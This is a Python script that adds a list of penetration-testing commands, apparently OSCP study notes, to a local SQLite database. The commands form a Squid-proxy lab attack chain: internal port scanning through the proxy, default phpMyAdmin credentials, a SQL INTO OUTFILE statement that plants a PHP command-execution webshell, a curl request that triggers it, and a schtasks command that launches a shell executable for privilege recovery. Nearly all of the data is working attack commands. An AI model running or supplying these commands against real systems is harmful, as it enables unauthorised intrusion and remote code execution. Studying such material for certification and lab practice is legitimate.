#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - SQUID BOX PATCH       ##
##############################################
Adds Squid proxy enumeration and phpMyAdmin RCE commands
Usage:
    python3 squid_patch.py
"""
import sqlite3, os
DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "curl",
        "description": "Confirm Squid proxy is running on port 3128",
        "command": "curl -x http://TARGET_IP:3128 http://TARGET_IP/",
        "category": "enumeration",
        "tags": "squid,proxy,enumeration,web"
    },
    {
        "tool": "curl",
        "description": "Enumerate open internal ports through Squid proxy -- 200/302/403 = open, 000/503 = closed",
        "command": "for port in 21 22 80 443 3306 8080 8888 8443; do result=$(curl -s -x http://PROXY_IP:3128 http://127.0.0.1:$port/ -o /dev/null -w \"%{http_code}\" --max-time 3); echo \"Port $port: HTTP $result\"; done",
        "category": "enumeration",
        "tags": "squid,proxy,enumeration,port-scan,curl,internal"
    },
    {
        "tool": "curl",
        "description": "Access internal web service through Squid proxy",
        "command": "curl -s -x http://PROXY_IP:3128 http://127.0.0.1:PORT/",
        "category": "enumeration",
        "tags": "squid,proxy,web,internal,curl"
    },
    {
        "tool": "proxychains",
        "description": "Configure proxychains to use Squid HTTP proxy -- add to /etc/proxychains4.conf",
        "command": "echo 'http PROXY_IP 3128' >> /etc/proxychains4.conf",
        "category": "enumeration",
        "tags": "squid,proxy,proxychains,config,enumeration"
    },
    {
        "tool": "Firefox",
        "description": "Firefox proxy bypass for localhost -- use target IP instead of 127.0.0.1 when proxying through Squid",
        "command": "http://TARGET_IP:PORT/phpmyadmin/",
        "category": "enumeration",
        "tags": "squid,proxy,firefox,browser,localhost,bypass"
    },
    {
        "tool": "phpMyAdmin",
        "description": "Default phpMyAdmin credentials to try -- WAMP/XAMPP default is root with empty password",
        "command": "root : (empty) | root : root | admin : admin | pma : (empty)",
        "category": "exploitation",
        "tags": "phpmyadmin,default-creds,mysql,wamp,xampp,web"
    },
    {
        "tool": "phpMyAdmin",
        "description": "Write PHP webshell to web root via phpMyAdmin SQL -- WAMP web root is C:/wamp/www/",
        "command": "SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE \"C:/wamp/www/shell.php\"",
        "category": "exploitation",
        "tags": "phpmyadmin,mysql,webshell,php,sql,rce,wamp"
    },
    {
        "tool": "curl",
        "description": "Trigger PHP webshell through Squid proxy",
        "command": "curl -s -x http://PROXY_IP:3128 \"http://TARGET_IP:8080/shell.php?cmd=whoami\"",
        "category": "exploitation",
        "tags": "squid,proxy,webshell,php,rce,curl"
    },
    {
        "tool": "schtasks",
        "description": "Recover LOCAL SERVICE privileges via scheduled task -- spawns process with full token",
        "command": "schtasks /create /tn \"privs\" /tr \"C:\\Windows\\Temp\\shell.exe\" /sc onstart /ru \"LOCAL SERVICE\" /f && schtasks /run /tn \"privs\"",
        "category": "privesc",
        "tags": "windows,privesc,schtasks,local-service,token,privilege-recovery"
    },
    {
        "tool": "nmap",
        "description": "Scan ports through Squid proxy using proxychains",
        "command": "proxychains nmap -sT -p 80,443,3306,8080,8888 127.0.0.1",
        "category": "enumeration",
        "tags": "squid,proxy,proxychains,nmap,port-scan,internal"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
